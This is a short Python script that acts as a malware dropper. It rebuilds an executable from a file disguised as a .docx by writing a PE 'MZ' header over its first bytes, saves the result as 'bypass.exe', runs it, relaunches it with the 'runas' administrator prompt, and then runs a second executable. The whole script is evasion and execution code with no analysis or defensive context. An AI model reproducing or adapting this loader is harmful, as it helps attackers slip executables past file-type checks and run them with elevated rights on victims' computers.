#4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00
import os

def RunFile(path_to_file):
	os.system(path_to_file)

def transfer(fileNameBefore, fileNameAfter):
    old = open(fileNameBefore, "rb").read() #GameRan.docx
    new = open(fileNameAfter, "wb") #GameRan.exe
    check = False
    for i in range(0, len(old), 16):
        S = old[i:i+16]
        if check == False:
            S = [77, 90, 144, 0, 3, 0, 0, 0, 4, 0, 0, 0, 255, 255, 0, 0]
            array=bytearray(S)
            new.write(array)
            check = True
        else:
            new.write(S)
def hidden(path):
    os.system(path)

transfer("thongTin.docx", "bypass.exe")
hidden("bypass.exe")
os.startfile('bypass.exe', 'runas')
RunFile('gameRan.exe')
